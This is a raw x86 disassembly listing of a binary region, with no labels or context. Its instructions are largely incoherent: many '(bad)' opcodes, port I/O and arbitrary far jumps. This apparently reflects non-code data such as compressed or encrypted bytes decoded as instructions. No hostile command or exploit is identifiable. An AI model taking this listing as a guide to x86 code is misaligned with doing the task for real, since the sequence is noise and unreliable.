  47a567:	sub    ebx,DWORD PTR [edx]
  47a569:	in     eax,0xb7
  47a56b:	dec    edx
  47a56c:	scas   al,BYTE PTR es:[edi]
  47a56d:	int    0xbf
  47a56f:	lahf   
  47a570:	lahf   
  47a571:	mov    eax,0xc03d0302
  47a576:	fcmovb st,st(6)
  47a578:	dec    ebx
  47a579:	lock sub edx,ecx
  47a57c:	cmp    al,0x40
  47a57e:	outs   dx,DWORD PTR ds:[esi]
  47a57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a580:	(bad)  
  47a581:	test   DWORD PTR [edi+0x21],ebx
  47a584:	lahf   
  47a585:	mov    al,ds:0x8f9746a9
  47a58a:	retf   0x7f26
  47a58d:	pinsrw mm7,eax,0x7f
  47a591:	adc    DWORD PTR [edi-0x943e121],0x592fcc2f
  47a59b:	jle    0x47a5d2
  47a59d:	js     0x47a552
  47a59f:	(bad)  
  47a5a0:	test   eax,0x307c293a
  47a5a5:	cmp    bl,BYTE PTR [eax+0x3f]
  47a5a8:	scas   eax,DWORD PTR es:[edi]
  47a5a9:	(bad)  
  47a5aa:	adc    eax,0x18090f4f
  47a5af:	xchg   edx,eax
  47a5b0:	or     eax,0xdf68d850
  47a5b5:	iret   
  47a5b6:	pop    ds
  47a5b7:	jmp    FWORD PTR [edi]
  47a5b9:	mov    eax,0x56d27ffe
  47a5be:	inc    DWORD PTR [edi+ebp*8]
  47a5c1:	jno    0x47a61b
  47a5c3:	sbb    eax,0xd490f65a
  47a5c8:	arpl   WORD PTR [edi+0x6d],di
  47a5cb:	test   eax,0x6eb62db2
  47a5d0:	xchg   ebp,eax
  47a5d1:	pxor   mm0,QWORD PTR [ecx+0x45]
  47a5d5:	adc    dh,BYTE PTR [edi+0x70db3040]
  47a5db:	lock cmp al,0x24
  47a5de:	ins    DWORD PTR es:[edi],dx
  47a5df:	mov    ch,0x5f
  47a5e1:	mov    edi,0xb45bcf07
  47a5e6:	loopne 0x47a603
  47a5e8:	fild   WORD PTR [esi+0x7f6110b5]
  47a5ee:	das    
  47a5ef:	imul   edi,DWORD PTR [ebx+ecx*4-0x2a],0xffffffad
  47a5f4:	mov    edi,0x3f3f10df
  47a5f9:	les    edi,FWORD PTR [ebp-0x5d]
  47a5fc:	sbb    al,BYTE PTR [eax-0x2c]
  47a5ff:	ins    DWORD PTR es:[edi],dx
  47a600:	stos   DWORD PTR es:[edi],eax
  47a601:	adc    bl,BYTE PTR [edi+0x15fb44f]
  47a607:	mov    eax,esp
  47a609:	(bad)  
  47a60a:	or     ebx,esp
  47a60c:	fild   WORD PTR [ebx+0x4c98037b]
  47a612:	mov    bh,0xd4
  47a614:	das    
  47a615:	and    ebx,DWORD PTR [ecx]
  47a617:	je     0x47a5ea
  47a619:	shr    BYTE PTR [edi-0x21],1
  47a61c:	push   ds
  47a61d:	(bad)  
  47a61e:	and    BYTE PTR [esi+0x62],cl
  47a621:	je     0x47a662
  47a623:	mov    bh,BYTE PTR [edi]
  47a625:	mov    esp,0x2c83260f
  47a62a:	aas    
  47a62b:	add    esp,ebp
  47a62d:	out    dx,eax
  47a62e:	jbe    0x47a690
  47a630:	pusha  
  47a631:	pop    es
  47a632:	outs   dx,DWORD PTR ds:[esi]
  47a633:	and    eax,0x899fdf9e
  47a638:	add    al,0x81
  47a63a:	or     ebp,DWORD PTR [esi+0x50]
  47a63d:	outs   dx,DWORD PTR ds:[esi]
  47a63e:	xor    eax,0x756ff7b
  47a643:	inc    ebx
  47a644:	sar    BYTE PTR [edi-0x31],0xaf
  47a648:	lea    ecx,[edi-0xb4f5d01]
  47a64e:	cmp    DWORD PTR [esi],ebx
  47a650:	xchg   edi,eax
  47a651:	dec    edi
  47a652:	sub    ecx,DWORD PTR [edi-0x4f012911]
  47a658:	cmp    eax,DWORD PTR [esi+0x2fe3763e]
  47a65e:	dec    ebp
  47a65f:	mov    ds:0xfff6ecf,al
  47a664:	mov    ah,bl
  47a666:	xchg   DWORD PTR [eax],esi
  47a668:	scas   eax,DWORD PTR es:[edi]
  47a669:	call   DWORD PTR [eax-0x7d]
  47a66c:	lea    ebp,[eax+0x1f7fc58c]
  47a672:	(bad)  
  47a673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a674:	xor    BYTE PTR [ecx],ch
  47a676:	add    dh,ch
  47a678:	xor    ch,0x8d
  47a67b:	xchg   ebp,eax
  47a67c:	iret   
  47a67d:	popa   
  47a67e:	shr    BYTE PTR [edi],0x4a
  47a681:	jg     0x47a6a2
  47a683:	rcr    BYTE PTR es:[ebx-0x2023c808],1
  47a68a:	or     BYTE PTR [esi-0x47],bl
  47a68d:	aas    
  47a68e:	push   0x2e
  47a690:	(bad)  
  47a691:	mov    cl,0x1a
  47a693:	cs int 0x2d
  47a696:	pop    edi
  47a697:	dec    esp
  47a698:	mov    ds:0x8d886d59,al
  47a69d:	shr    BYTE PTR [edi],cl
  47a69f:	and    edi,DWORD PTR [edi-0x431015b1]
  47a6a5:	shr    BYTE PTR [edx-0x75],1
  47a6a8:	lahf   
  47a6a9:	and    DWORD PTR [edi],ebp
  47a6ab:	aas    
  47a6ac:	add    ecx,DWORD PTR [edi-0x2a]
  47a6af:	(bad)  
  47a6b0:	pop    eax
  47a6b1:	das    
  47a6b2:	dec    esp
  47a6b3:	jg     0x47a644
  47a6b5:	out    dx,eax
  47a6b6:	stos   DWORD PTR es:[edi],eax
  47a6b7:	pop    edi
  47a6b8:	inc    BYTE PTR [edx+0xb]
  47a6bb:	fcmovnb st,st(7)
  47a6bd:	outs   dx,DWORD PTR ds:[esi]
  47a6be:	or     DWORD PTR [edx-0x5a],edx
  47a6c1:	scas   eax,DWORD PTR es:[edi]
  47a6c2:	jae    0x47a6cd
  47a6c4:	add    cl,BYTE PTR [ebp-0x4494fd54]
  47a6ca:	shr    DWORD PTR ds:0xff713bff,1
  47a6d0:	outs   dx,DWORD PTR ds:[esi]
  47a6d1:	mov    al,0xaf
  47a6d3:	ss das 
  47a6d5:	mov    esi,0xef9bead4
  47a6da:	and    al,0xc6
  47a6dc:	xor    BYTE PTR [esi+0x5f],cl
  47a6df:	jg     0x47a66d
  47a6e1:	xchg   esp,eax
  47a6e2:	aas    
  47a6e3:	and    ebx,DWORD PTR [ebp+0x1f152eb9]
  47a6e9:	lahf   
  47a6ea:	aas    
  47a6eb:	shr    edi,cl
  47a6ed:	das    
  47a6ee:	or     ebp,DWORD PTR [ebx-0x5d]
  47a6f1:	jg     0x47a6fc
  47a6f3:	pop    ds
  47a6f4:	sub    al,BYTE PTR [ebp+0x252394d7]
  47a6fa:	outs   dx,DWORD PTR ds:[esi]
  47a6fb:	sub    BYTE PTR [edi],0xff
  47a6fe:	int    0xc0
  47a700:	ins    DWORD PTR es:[edi],dx
  47a701:	(bad)  
  47a702:	pcmpgtw mm7,QWORD PTR [edx-0x11]
  47a706:	pop    edi
  47a707:	sbb    BYTE PTR es:[ebp+esi*4+0x31c6611b],dl
  47a70f:	outs   dx,DWORD PTR ds:[esi]
  47a710:	cmc    
  47a711:	jg     0x47a6f6
  47a713:	dec    eax
  47a714:	sub    DWORD PTR [ecx-0x71],edi
  47a717:	int3   
  47a718:	xchg   edx,eax
  47a719:	cmp    BYTE PTR ss:[ecx],bl
  47a71c:	shl    BYTE PTR [edx+ebx*1+0x7a4f9223],0x74
  47a724:	daa    
  47a725:	or     eax,0xb9e37ade
  47a72a:	add    dh,0x4f
  47a72d:	dec    edi
  47a72e:	sar    dh,0xbf
  47a731:	or     DWORD PTR [ecx+0x46],0xc05c6c8f
  47a738:	les    ebp,FWORD PTR [ecx-0x42]
  47a73b:	das    
  47a73c:	rol    BYTE PTR [ecx-0x1c35ac46],1
  47a742:	sbb    edi,edi
  47a744:	sbb    edi,DWORD PTR [esp+eiz*2]
  47a747:	cmp    BYTE PTR [edx],cl
  47a749:	fsubr  QWORD PTR [ebx+0x42e6fed]
  47a74f:	dec    DWORD PTR [ecx+0x45]
  47a752:	stos   BYTE PTR es:[edi],al
  47a753:	inc    eax
  47a754:	arpl   WORD PTR ds:0x1f50bffd,bp
  47a75a:	mov    ch,0xd6
  47a75c:	ficomp DWORD PTR [ecx+0x43]
  47a75f:	fs jmp 0xda71c445
  47a765:	ret    0xfc6a
  47a768:	std    
  47a769:	inc    esi
  47a76a:	pop    ebx
  47a76b:	fbld   TBYTE PTR [ebx+0x6656fbf]
  47a771:	test   DWORD PTR [ebp+0x2735241f],esp
  47a777:	push   0xffffffad
  47a779:	les    eax,FWORD PTR [ebx]
  47a77b:	(bad)  
  47a77c:	je     0x47a75d
  47a77e:	fistp  QWORD PTR [edi]
  47a780:	outs   dx,DWORD PTR ds:[esi]
  47a781:	cld    
  47a782:	add    eax,0x5e37575e
  47a787:	add    ebp,DWORD PTR [esi-0x28]
  47a78a:	cmp    BYTE PTR [edi],ch
  47a78c:	adc    al,0xde
  47a78e:	cwde   
  47a78f:	dec    edi
  47a790:	ret    0x275
  47a793:	rcr    BYTE PTR [ebp-0x1],1
  47a796:	push   edx
  47a797:	fbstp  TBYTE PTR [ebx-0x18]
  47a79a:	test   al,0xed
  47a79c:	pop    edx
  47a79d:	inc    ebx
  47a79e:	push   ecx
  47a79f:	das    
  47a7a0:	cs popf 
  47a7a2:	inc    ebx
  47a7a3:	fistp  QWORD PTR [esi]
  47a7a5:	aad    0xbd
  47a7a7:	ficomp WORD PTR [ebp+0x0]
  47a7aa:	fistp  WORD PTR [edi+0x65]
  47a7ad:	scas   eax,DWORD PTR es:[edi]
  47a7ae:	jno    0x47a759
  47a7b0:	aas    
  47a7b1:	add    BYTE PTR [eax+0x61],ch
  47a7b4:	mov    bl,0x52
  47a7b6:	in     al,dx
  47a7b7:	das    
  47a7b8:	std    
  47a7b9:	fcmovnu st,st(2)
  47a7bb:	add    BYTE PTR [edi],ch
  47a7bd:	pop    ds
  47a7be:	xchg   esi,eax
  47a7bf:	scas   eax,DWORD PTR es:[edi]
  47a7c0:	jae    0x47a74e
  47a7c2:	and    cl,BYTE PTR [eax+0x70]
  47a7c5:	push   0x1f
  47a7c7:	outs   dx,DWORD PTR ds:[esi]
  47a7c8:	sbb    ebx,DWORD PTR [ebx]
  47a7ca:	in     eax,dx
  47a7cb:	(bad)  
  47a7cc:	xchg   edx,eax
  47a7cd:	jg     0x47a7f7
  47a7cf:	popf   
  47a7d0:	aas    
  47a7d1:	scas   eax,DWORD PTR es:[edi]
  47a7d2:	js     0x47a7f3
  47a7d4:	cmp    edi,0xffffffff
  47a7d7:	in     eax,dx
  47a7d8:	jmp    FWORD PTR [ebp+0x57]
  47a7db:	ror    DWORD PTR [eax+0x24],0xa4
  47a7df:	imul   ebx
  47a7e1:	ja     0x47a848
  47a7e3:	je     0x47a804
  47a7e5:	mov    ah,0xa5
  47a7e7:	cmp    DWORD PTR [ebp-0x54],esi
  47a7ea:	or     ah,BYTE PTR [ecx-0x21]
  47a7ed:	nop
  47a7ee:	std    
  47a7ef:	mov    al,0xec
  47a7f1:	popf   
  47a7f2:	jo     0x47a7ae
  47a7f4:	inc    ebp
  47a7f5:	push   0xfffffff0
  47a7f7:	(bad)  
  47a7f8:	(bad)  
  47a7f9:	(bad)  
  47a7fb:	icebp  
  47a7fc:	mov    esi,0x396c7931
  47a801:	cmp    al,0x9
  47a803:	scas   al,BYTE PTR es:[edi]
  47a804:	mov    BYTE PTR [ebx-0xe127d09],ah
  47a80a:	xlat   BYTE PTR ds:[ebx]
  47a80b:	loop   0x47a7e5
  47a80d:	addr16 sar bh,cl
  47a810:	(bad)  
  47a811:	fistp  WORD PTR [edi+eax*2-0x11]
  47a815:	cmp    eax,0xa58c24b4
  47a81a:	ret    0xd77c
  47a81d:	and    eax,0xe1144f5b
  47a822:	ds loopne 0x47a7bc
  47a825:	or     al,0xc9
  47a827:	adc    eax,0xf85f1169
  47a82c:	(bad)  
  47a82d:	(bad)  
  47a82e:	fmul   st,st(2)
  47a830:	mov    bh,0x24
  47a832:	bound  eax,QWORD PTR gs:[ecx+0x2cc16a2a]
  47a839:	adc    eax,0x7e75349f
  47a83e:	xchg   esi,eax
  47a83f:	jmp    0x9ab1fd95
  47a844:	popa   
  47a845:	cld    
  47a846:	out    0x55,al
  47a848:	icebp  
  47a849:	pop    ss
  47a84a:	clc    
  47a84b:	fnstsw WORD PTR [ebx-0x5e]
  47a84e:	addr16 push edx
  47a850:	retf   0x408b
  47a853:	div    ah
  47a855:	dec    ebx
  47a856:	ret    
  47a857:	xchg   DWORD PTR [edi],edx
  47a859:	(bad)  
  47a85a:	outs   dx,DWORD PTR ds:[esi]
  47a85b:	inc    ecx
  47a85c:	out    dx,eax
  47a85d:	inc    esi
  47a85e:	pop    ecx
  47a85f:	push   edi
  47a860:	or     al,0xf1
  47a862:	inc    edi
  47a863:	(bad)  
  47a864:	or     eax,edx
  47a866:	dec    DWORD PTR [ebp-0x5a80e90e]
  47a86c:	mov    edi,0x727f42f
  47a871:	imul   esi,DWORD PTR [eax+0x1e1a3a8f],0xffffff89
  47a878:	fist   WORD PTR ds:0xc26f7b5d
  47a87e:	xchg   ecx,eax
  47a87f:	fiadd  DWORD PTR [eax]
  47a881:	pop    edi
  47a882:	push   ss
  47a883:	inc    edi
  47a884:	dec    edi
  47a885:	adc    eax,0xfe3b1f4c
  47a88a:	clc    
  47a88b:	jg     0x47a8ad
  47a88d:	fs adc eax,0x7377b08d
  47a893:	ret    0x446c
  47a896:	lahf   
  47a897:	ret    
  47a898:	sar    DWORD PTR [edx],0x8f
  47a89b:	mov    dh,0x1e
  47a89d:	not    edx
  47a89f:	mov    ebx,0x3d832bfa
  47a8a4:	push   esp
  47a8a5:	jns    0x47a846
  47a8a7:	repz mov bh,0x27
  47a8aa:	cmp    BYTE PTR [edi],ch
  47a8ac:	mov    ebx,0xd8df6f55
  47a8b1:	mov    WORD PTR [esi+0x69],ss
  47a8b4:	arpl   WORD PTR ds:0x1f8f1fef,di
  47a8ba:	lea    edi,[edi]
  47a8bc:	add    al,0x6
  47a8be:	das    
  47a8bf:	push   ebx
  47a8c0:	mov    bh,0xbd
  47a8c2:	add    eax,0x1b83ef28
  47a8c7:	mov    cl,0x5
  47a8c9:	fbld   TBYTE PTR [edi+ebp*4]
  47a8cc:	nop    DWORD PTR [edi]
  47a8cf:	xor    al,0x36
  47a8d1:	mov    dh,0x7e
  47a8d3:	mov    al,0x13
  47a8d5:	add    ch,al
  47a8d7:	sbb    eax,0xd2af3fdf
  47a8dc:	das    
  47a8dd:	cmc    
  47a8de:	and    eax,0x2fff4c96
  47a8e3:	sub    al,0x9f
  47a8e5:	add    esi,DWORD PTR [ecx+0x39]
  47a8e8:	mov    sp,0xa9b0
  47a8ec:	mov    ebp,0x2d3c886f
  47a8f1:	aas    
  47a8f2:	(bad)  
  47a8f4:	ja     0x47a8b5
  47a8f6:	cmp    BYTE PTR [ebp-0x4f],ah
  47a8f9:	ins    DWORD PTR es:[edi],dx
  47a8fa:	lock xchg edi,eax
  47a8fc:	sub    BYTE PTR [edi-0x1d70f461],bl
  47a902:	dec    ebx
  47a903:	cmp    dl,al
  47a905:	jg     0x47a93e
  47a907:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  47a909:	cvtps2pi mm3,QWORD PTR [edi]
  47a90c:	mov    ds:0xf90519f,eax
  47a911:	lahf   
  47a912:	dec    eax
  47a913:	push   es
  47a914:	adc    ecx,0xffffffd2
  47a917:	pop    ds
  47a918:	jno    0x47a8a9
  47a91a:	fistp  QWORD PTR [edx+0x3d0edb80]
  47a920:	outs   dx,DWORD PTR ds:[esi]
  47a921:	fisttp WORD PTR [edx]
  47a923:	inc    edx
  47a924:	aas    
  47a925:	dec    esp
  47a926:	xor    dl,0xb8
  47a929:	mov    edx,edx
  47a92b:	mov    eax,ds:0x777f00a7
  47a930:	fistp  WORD PTR [eax-0x5f274851]
  47a936:	hlt    
  47a937:	add    ebx,DWORD PTR ds:0x5f38efdf
  47a93d:	dec    esi
  47a93e:	popa   
  47a93f:	outs   dx,BYTE PTR ds:[esi]
  47a940:	mov    ebp,0x5d08ff99
  47a945:	test   ebp,edi
  47a947:	mov    ds:0xb3311a07,al
  47a94c:	call   FWORD PTR [edx+0x7a]
  47a94f:	or     edi,DWORD PTR [edi-0x2e]
  47a952:	retf   0xfcbf
  47a955:	sbb    ebx,DWORD PTR [ebp+0x4]
  47a958:	loopne 0x47a9d9
  47a95a:	add    al,dh
  47a95c:	sbb    eax,0x4e1d5c2d
  47a961:	mov    bl,0x17
  47a963:	dec    edx
  47a964:	aas    
  47a965:	cmp    edi,0xafeb6946
  47a96b:	xor    esp,DWORD PTR [esi]
  47a96d:	(bad)  
  47a96f:	(bad)  
  47a971:	rol    ebp,1
  47a973:	push   ebx
  47a974:	push   es
  47a975:	dec    ecx
  47a976:	mov    edi,0xd0bc478e
  47a97b:	inc    esi
  47a97c:	movntq QWORD PTR [edi-0x2099de98],mm7
  47a983:	loop   0x47a93c
  47a985:	rcl    BYTE PTR [esi+ebp*1-0x51],0x7f
  47a98a:	cmp    cl,BYTE PTR [esi]
  47a98c:	cmp    DWORD PTR [esi+ecx*2-0x10],edx
  47a990:	das    
  47a991:	mov    ch,0x16
  47a993:	pop    ds
  47a994:	add    ecx,edi
  47a996:	aas    
  47a997:	add    al,0x1a
  47a999:	jmp    0x81ba:0x642a2d0d
  47a9a0:	add    eax,0x87cb6f6e
  47a9a5:	aas    
  47a9a6:	push   ds
  47a9a7:	scas   eax,DWORD PTR es:[edi]
  47a9a8:	adc    ebp,ebp
  47a9aa:	sub    al,0xd4
  47a9ac:	pop    ebx
  47a9ad:	outs   dx,DWORD PTR ds:[esi]
  47a9ae:	ror    BYTE PTR [edi-0x58014201],1
  47a9b4:	dec    edi
  47a9b5:	add    eax,DWORD PTR [ebp+0x76c2eabf]
  47a9bb:	jmp    0x47a9ac
  47a9bd:	jmp    DWORD PTR [eax+ebp*2]
  47a9c0:	setbe  BYTE PTR [edi]
  47a9c3:	sbb    eax,0x28dfe088
  47a9c8:	aad    0x3f
  47a9ca:	test   eax,0x485462d6
  47a9cf:	mov    edi,0xd53c87d6
  47a9d4:	sbb    dh,BYTE PTR ds:0x8fbc6fd8
  47a9da:	mov    edi,0xb608c82f
  47a9df:	push   0xbba27fef
  47a9e4:	add    eax,ebx
  47a9e6:	or     BYTE PTR [eax+0x12408200],cl
  47a9ec:	add    DWORD PTR [ecx+0x222c998],eax
  47a9f2:	sbb    DWORD PTR ds:0xa320550,eax
  47a9f8:	mov    al,ds:0x4014640a
  47a9fd:	adc    eax,0x2a8028c8
  47aa02:	nop
  47aa03:	push   ecx
  47aa04:	add    BYTE PTR [eax+eiz*1-0x5d],dl
  47aa08:	add    BYTE PTR [eax+0x50014640],ch
  47aa0e:	or     DWORD PTR [edx+eax*1+0x51902a0],0xa320540
  47aa19:	or     BYTE PTR [edx],0x64
  47aa1c:	adc    al,0x0
  47aa1e:	adc    eax,0x2a0028c8
  47aa23:	nop
  47aa24:	push   ecx
  47aa25:	add    DWORD PTR [eax+eiz*1-0x5d],edx
  47aa29:	add    ch,BYTE PTR [eax+0x50054640]
  47aa2f:	or     DWORD PTR [edx+ecx*1+0x141902a0],0x28320540
  47aa3a:	or     BYTE PTR [edx],0x64
  47aa3d:	push   ecx
  47aa3e:	add    BYTE PTR ds:0x2a00a3c8,dl
  47aa44:	nop
  47aa45:	inc    esi
  47aa46:	add    DWORD PTR [eax+eiz*1-0x74],edx
  47aa4a:	add    ch,BYTE PTR [eax+0x50051840]
  47aa50:	and    DWORD PTR [edx-0x317efdd8],0x1fffffe4
  47aa5a:	add    eax,0x4d004900
  47aa5f:	add    BYTE PTR [ecx+0x0],al
  47aa62:	inc    edi
  47aa63:	add    BYTE PTR [ebp+0x0],al
  47aa66:	add    eax,DWORD PTR [eax]
  47aa68:	xor    DWORD PTR [eax],eax
  47aa6a:	xor    BYTE PTR [eax],al
  47aa6c:	xor    al,BYTE PTR [eax]
  47aa6e:	inc    edx
  47aa6f:	dec    ebp
  47aa70:	inc    edx
  47aa71:	jnp    0x47aabc
  47aa73:	call   0x501:0x28033eee
  47aa7a:	add    BYTE PTR [ebx+0x47205cb],bh
  47aa80:	add    bh,bh
  47aa82:	add    BYTE PTR [eax+0x7341500f],al
  47aa88:	and    edi,edi
  47aa8a:	(bad)  
  47aa8b:	cmp    ah,BYTE PTR [edx+0x44b5dd71]
  47aa91:	jecxz  0x47aa13
  47aa93:	fidivr WORD PTR ds:0x4928a21b
  47aa99:	shl    bl,1
  47aa9b:	(bad)  
  47aa9d:	mov    ebx,0xa9177fff
  47aaa2:	lds    ebp,FWORD PTR [ecx-0x2b]
  47aaa5:	scas   al,BYTE PTR es:[edi]
  47aaa6:	lods   al,BYTE PTR ds:[esi]
  47aaa7:	pop    esp
  47aaa8:	jg     0x47aa85
  47aaaa:	push   eax
  47aaab:	addr16 mov ds:0x3a86,al
  47aaaf:	lods   eax,DWORD PTR ds:[esi]
  47aab0:	das    
  47aab1:	xor    al,0x91
  47aab3:	out    dx,eax
  47aab4:	stos   BYTE PTR es:[edi],al
  47aab5:	push   edx
  47aab6:	outs   dx,DWORD PTR ds:[esi]
  47aab7:	fistp  DWORD PTR [eax+0x2c]
  47aaba:	loope  0x47aa85
  47aabc:	(bad)  
  47aabd:	(bad)  
  47aabf:	lods   al,BYTE PTR ds:[esi]
  47aac0:	or     al,0x93
  47aac2:	inc    ebp
  47aac3:	fnstsw WORD PTR [esi-0x3392f748]
  47aac9:	push   ds
  47aaca:	sub    al,0xa8
  47aacc:	test   BYTE PTR [esi-0x29],dl
  47aacf:	jno    0x47aaad
  47aad1:	dec    edi
  47aad2:	mov    ebx,0x459bffb1
  47aad7:	xlat   BYTE PTR ds:[ebx]
  47aad8:	pop    ss
  47aad9:	scas   eax,DWORD PTR es:[edi]
  47aada:	jmp    0x6f4f:0xb1f08636
  47aae1:	rcr    DWORD PTR [edi-0x51],1
  47aae4:	outs   dx,DWORD PTR ds:[esi]
  47aae5:	xor    DWORD PTR [ebp-0x37b353],eax
  47aaeb:	repnz or DWORD PTR [edi+0x7e],0xa43b47d2
  47aaf3:	or     BYTE PTR [ecx],0xd1
  47aaf6:	xchg   edx,eax
  47aaf7:	or     ah,BYTE PTR [eax+edx*1]
  47aafa:	fld    DWORD PTR [eax+eax*1+0x0]
  47aafe:	adc    eax,0x2a220048
  47ab03:	nop
  47ab04:	push   ecx
  47ab05:	add    BYTE PTR [eax+eiz*1-0x5d],dl
  47ab09:	add    BYTE PTR [eax+0x50014640],ch
  47ab0f:	or     DWORD PTR [edx+eax*1+0x51902a0],0xa320540
  47ab1a:	or     BYTE PTR [edx],0x64
  47ab1d:	adc    al,0x0
  47ab1f:	adc    eax,0x2a0028c8
  47ab24:	nop
  47ab25:	push   ecx
  47ab26:	add    DWORD PTR [eax+eiz*1-0x5d],edx
  47ab2a:	add    ch,BYTE PTR [eax+0x50054640]
  47ab30:	or     DWORD PTR [edx+ecx*1+0x141902a0],0x26320540
  47ab3b:	sub    BYTE PTR [eax],0x6c
  47ab3e:	or     DWORD PTR [esp+edi*2-0xe],edi
  47ab42:	mov    edi,0x1c0086c
  47ab47:	ins    BYTE PTR es:[edi],dx
  47ab48:	jae    0x47abbe
  47ab4a:	jb     0x47abaf
  47ab4c:	jo     0x47abc7
  47ab4e:	push   edi
  47ab4f:	ins    BYTE PTR es:[edi],dx
  47ab50:	outs   dx,BYTE PTR gs:[esi]
  47ab52:	(bad)  
  47ab53:	mov    edi,0x1d419764
  47ab58:	or     al,BYTE PTR [ebx+0x6c]
  47ab5b:	outs   dx,DWORD PTR ds:[esi]
  47ab5c:	jae    0x47abc3
  47ab5e:	dec    eax
  47ab5f:	popa   
  47ab60:	outs   dx,BYTE PTR ds:[esi]
  47ab61:	push   DWORD PTR fs:[ebp+0xc19d75b]
  47ab68:	outs   dx,DWORD PTR ds:[esi]
  47ab69:	adc    al,0x46
  47ab6b:	imul   ecx,DWORD PTR [ecx],0x61657217
  47ab71:	je     0x47abd8
  47ab73:	or     DWORD PTR [ebx-0xa],ecx
  47ab76:	fild   DWORD PTR [ecx+ebp*2+0x6]
  47ab7a:	arpl   WORD PTR [edi+ebp*2+0x72],si
  47ab7e:	jns    0x47ab91
  47ab80:	push   ds
  47ab81:	fisttp DWORD PTR [esi-0xa]
  47ab84:	jg     0x47ab92
  47ab86:	dec    ebp
  47ab87:	popa   
  47ab88:	jo     0x47abfa
  47ab8a:	imul   ebp,DWORD PTR [esi+0x67],0x3754d13
  47ab91:	js     0x47aba0
  47ab93:	xchg   ebx,eax
  47ab94:	mov    esp,0x725027fb
  47ab99:	outs   dx,DWORD PTR ds:[esi]
  47ab9a:	arpl   WORD PTR [ebp+0x73],sp
  47ab9d:	jae    0x47abdd
  47ab9f:	inc    esp
  47aba0:	gs ins BYTE PTR es:[edi],dx
  47aba2:	gs inc ebp
  47aba4:	lods   al,BYTE PTR ds:[esi]
  47aba5:	mov    ch,0x16
  47aba7:	in     al,dx
  47aba8:	js     0x47ac13
  47abaa:	je     0x47abc6
  47abac:	or     al,0x13
  47abae:	jge    0x47ab36
  47abb0:	or     edx,esi
  47abb2:	mov    dh,0x59
  47abb4:	or     al,BYTE PTR [ebx]
  47abb6:	jb     0x47ab56
  47abb8:	daa    
  47abb9:	paddsw mm6,QWORD PTR [esi+0x60]
  47abbd:	in     eax,dx
  47abbe:	dec    esi
  47abbf:	dec    esi
  47abc0:	push   cs
  47abc1:	push   edx
  47abc2:	xor    ebp,DWORD PTR [edi+0x75]
  47abc5:	mov    ebp,0x62dfdacd
  47abca:	push   cs
  47abcb:	bound  esp,QWORD PTR [ebp+0x4c]
  47abce:	imul   esp,DWORD PTR [edx+0x72],0xbb0c9f61
  47abd5:	pop    ebx
  47abd6:	fild   DWORD PTR [esi+0x6b470d1b]
  47abdc:	int3   
  47abdd:	ins    DWORD PTR es:[edi],dx
  47abde:	jo     0x47ab6b
  47abe0:	jb     0x47ac30
  47abe2:	pop    ebx
  47abe3:	fs enter 0x61de,0x6d
  47abe8:	sub    al,0x11
  47abea:	push   edi
  47abeb:	fbstp  TBYTE PTR [ebx-0x1]
  47abee:	div    DWORD PTR [esi+0x53386bbf]
  47abf4:	jo     0x47ac57
  47abf6:	xor    eax,0x7214b645
  47abfb:	imul   esi,DWORD PTR [esi+0x65],0xed707954
  47ac02:	in     eax,dx
  47ac03:	mul    BYTE PTR [eax+0x35]
  47ac06:	inc    ebp
  47ac07:	outs   dx,BYTE PTR ds:[esi]
  47ac08:	jbe    0x47ab9b
  47ac0a:	outs   dx,DWORD PTR ds:[esi]
  47ac0b:	outs   dx,BYTE PTR ds:[esi]
  47ac0c:	xor    ch,BYTE PTR [esi+0x74]
  47ac0f:	push   esi
  47ac10:	imul   ebx,DWORD PTR [edx-0x1f],0x6169f66c
  47ac17:	bound  ebp,QWORD PTR [eax+ebx*1-0x6c]
  47ac1b:	je     0x47ac66
  47ac1d:	sbb    ebx,0x54eb2fb3
  47ac23:	jae    0x47ac38
  47ac25:	push   ebx
  47ac26:	imul   edi,DWORD PTR [edx-0x7f],0x45c8614c
  47ac2d:	(bad)  
  47ac2e:	mov    esi,0x3b72b6cd
  47ac33:	jb     0x47ac42
  47ac35:	out    dx,al
  47ac36:	popa   
  47ac37:	ins    BYTE PTR es:[edi],dx
  47ac38:	push   esp
  47ac39:	imul   eax,DWORD PTR [edi+0xd],0x5fdefdcc
  47ac40:	gs dec ecx
  47ac42:	outs   dx,BYTE PTR ds:[esi]
  47ac43:	outs   dx,WORD PTR ds:[esi]
  47ac45:	cmp    BYTE PTR [edi],cl
  47ac47:	imul   edx,DWORD PTR [bx+di],0x7caf657b
  47ac4e:	ins    BYTE PTR es:[edi],dx
  47ac4f:	jae    0x47ac72
  47ac51:	dec    ebp
  47ac52:	outs   dx,DWORD PTR ds:[esi]
  47ac53:	fs jne 0x47aca6
  47ac56:	sar    DWORD PTR [eax+0x13b309b3],0xae
  47ac5d:	adc    DWORD PTR [eax+0x30],edx
  47ac60:	pop    edi
  47ac61:	imul   edi,DWORD PTR [eax+0x27],0x67
  47ac65:	data16 jp 0x47ac15
  47ac68:	imul   ebp,DWORD PTR [ebx-0x7c4c8cd0],0xad1f604b
  47ac72:	stos   DWORD PTR es:[edi],eax
  47ac73:	sbb    DWORD PTR [edx-0x7d90789f],edi
  47ac79:	inc    ecx
  47ac7a:	fs fs jb 0x47ac01
  47ac7e:	ud2    
  47ac80:	dec    eax
  47ac81:	pop    ss
  47ac82:	cs (bad) 
  47ac84:	push   ss
  47ac85:	mov    dh,0x70
  47ac87:	mov    ebp,0x6d657953
  47ac8c:	mov    dh,0x66
  47ac8e:	popa   
  47ac8f:	xor    DWORD PTR [eax-0x358d9465],esi
  47ac95:	ss dec ecx
  47ac97:	inc    esp
  47ac98:	pop    ss
  47ac99:	inc    edi
  47ac9a:	js     0x47ac67
  47ac9c:	xchg   esi,eax
  47ac9d:	sbb    DWORD PTR [esi+ecx*8],edx
  47aca0:	imul   edx,DWORD PTR [ebp+eiz*2-0x3e],0x502db66d
  47aca8:	jbe    0x47ad12
  47acaa:	sbb    al,0xf4
  47acac:	arpl   WORD PTR [ebx+0x7b],bp
  47acaf:	mov    eax,0x75c2b185
  47acb4:	aas    
  47acb5:	or     eax,0xa3738056
  47acba:	adc    dh,BYTE PTR [esi-0x3d]
  47acbd:	and    DWORD PTR [ebp+0x57],ebp
  47acc0:	shr    DWORD PTR [edi+0x77],cl
  47acc3:	jae    0x47ad14
  47acc5:	xchg   BYTE PTR [ebp+0x17],ch
  47acc8:	ss or  al,0x62
  47accb:	or     al,BYTE PTR [ecx+0x6c]
  47acce:	push   es
